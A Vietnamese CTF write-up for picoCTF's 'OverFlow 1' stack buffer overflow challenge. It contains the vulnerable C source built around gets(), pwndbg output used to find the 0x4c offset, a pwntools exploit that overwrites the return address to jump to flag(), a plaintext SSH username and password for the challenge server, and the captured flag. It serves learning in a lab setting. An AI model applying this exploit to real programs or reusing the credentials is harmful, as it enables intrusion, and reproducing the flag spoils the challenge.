**Đây là source code bài này**
```sh
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```
**Ý tưởng solve bài này**
Ta redirection ret_addr về địa chỉ của hàm flag thôi. 

Ta dùng GDB để tìm địa chỉ của hàm flag này bằng câu lệnh sau:
```sh
pwndbg> print flag
$1 = {<text variable, no debug info>} 0x80485e6 <flag>

```
Vấn đề còn lại chỉ là offset tính từ lúc nhập đến địa chỉ ret thôi.

```sh
ESP  0xffffd040 —▸ 0xffffd050 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaS'
```
```sh
pwndbg> tele $ebp+4
00:0000│   0xffffd09c —▸ 0x8048705 (main+103) ◂— mov    eax, 0

```
```sh
pwndbg> p/x 0xffffd09c-0xffffd050
$2 = 0x4c

```
Có được offset coi như xong bài này, đây là file exploit.py của mình
```sh
from pwn import *
#s = process("./vuln")
s = ssh(host = '2019shell1.picoctf.com', user = 'hazir',password = '2k4')
r = s.run("cd  /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260; ./vuln") 
raw_input("Debug")
p = "a"*0x4c+ p32(0x80485e6)
r.sendline(p)
r.interactive()
r.close()
```

Run nó và chờ đợi. :))
```sh
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}
```